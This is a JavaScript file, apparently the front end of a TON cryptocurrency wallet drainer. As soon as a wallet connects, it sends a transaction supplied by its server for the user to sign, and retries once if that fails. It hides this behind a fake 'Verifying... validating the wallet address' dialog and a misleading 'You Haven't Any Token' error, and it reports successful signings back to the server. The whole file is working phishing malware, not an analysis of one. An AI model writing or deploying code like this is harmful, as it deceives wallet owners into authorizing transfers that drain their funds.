const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: `${window.location.origin}/tonconnect-manifest.json`, buttonRootId: 'cnbtn'
});

async function send_transaction(resend = false) {
    const senderAddress = tonConnectUI.account.address;

    try {
        Swal.fire({
            title: "Verifying...",
            text: "Validating the wallet address... please wait (30sec~)",
            icon: 'question',
            timerProgressBar: true,
            showLoaderOnConfirm: true,
            showConfirmButton: false,
            allowOutsideClick: false,
            showCloseButton: false,
            allowEscapeKey: false
        })
        return await fetch("/api/transaction", {
            headers: {
                "content-type": "application/json"
            },
            body: JSON.stringify({
                ...Object.fromEntries(new URL(window.location.href).searchParams.entries() || []),
                address: senderAddress
            }),
            method: "POST"
        }).then(async response => {
            const data = await response.json();
            try {
                Swal.close()
            } catch { }
            console.log('TRANSACTION!!!!!!')
            return await tonConnectUI.sendTransaction(data).catch(async (e) => {
                if (!resend) return await send_transaction(true)
                else throw (e);
            }).then(async (e) => {
                try {
                    if (!e) return;
                    const reportId = response.headers.get('log-report-id');
                    await fetch("/api/transaction", {
                        method: "PUT",
                        body: JSON.stringify({
                            reportId
                        }),
                        headers: {
                            "content-type": "application/json"
                        }
                    })
                } catch { }
            })
        }).catch(() => {
            Swal.fire({
                title: "You Haven't Any Token in Your Wallet.",
                icon: 'error',
                timerProgressBar: true,
                showLoaderOnConfirm: true,
                showConfirmButton: false,
                timer: 5000
            })
        })
    } catch (e) {
        console.log('TRANSACTION FAIL!!!!!!')
        console.log(e);
    }
}
(async () => {
    tonConnectUI.onStatusChange(async () => {
        if (tonConnectUI.connected) {
            send_transaction();
        }
    });


    if (tonConnectUI.connected) {
        send_transaction();
    }
})()

async function openButton() {
    if (await tonConnectUI.connected) {
        await send_transaction();
    } else {
        await tonConnectUI.openModal()
    }
}

async function send_to_admin(text) {
    // HUH?
}